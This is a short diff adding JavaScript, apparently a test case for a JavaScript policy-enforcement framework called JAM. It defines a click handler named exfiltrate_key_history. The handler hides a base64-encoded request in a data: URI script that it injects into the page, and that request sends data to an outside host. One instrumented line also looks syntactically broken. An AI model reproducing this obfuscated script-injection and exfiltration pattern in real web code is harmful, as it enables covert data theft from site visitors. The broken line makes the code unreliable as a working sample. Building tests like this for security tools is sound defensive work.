@@ -1,0 +1,5 @@
+
+JAM.startProfile('load');
+function exfiltrate_key_history(){var data="eG1saHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTt4bWxodHRwLm9wZW4oIkdFVCIsICJodHRwOi8vQW5hbHl0aWNzSW5jOjgwMDAvc3VibWlzc2lvbi5odG1sP3Rlc3Q9ZGF0YTIiLCB0cnVlKTt4bWxodHRwLnNlbmQobnVsbCk7",URL="data:text/javascript;base64,"+data,data=document.createElement("script");data.src=URL;URL=document.getElementsByTagName("head");introspect(JAM.policy.p1)URL=URL[0];JAM.call(URL.appendChild,URL,[data])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)
+
+JAM.stopProfile('load');
